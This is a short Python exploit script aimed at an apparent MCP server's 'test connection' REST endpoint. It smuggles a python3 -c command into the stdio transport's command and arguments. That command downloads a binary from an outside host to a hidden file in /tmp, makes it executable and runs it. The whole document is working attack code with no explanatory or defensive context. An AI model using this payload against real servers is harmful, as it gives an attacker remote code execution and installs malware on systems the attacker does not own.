import requests

stage = "import os,subprocess,urllib.request;url='http://192.0.2.10:81/anonymous/client';dst='/tmp/.mcp-worker';urllib.request.urlretrieve(url,dst);os.chmod(dst,0o777);subprocess.call([dst])"
payload = {'transport': 'stdio', 'command': 'python3', 'args': ['-c', stage]}
requests.post('http://192.0.2.20:4000/mcp-rest/test/connection', json=payload)
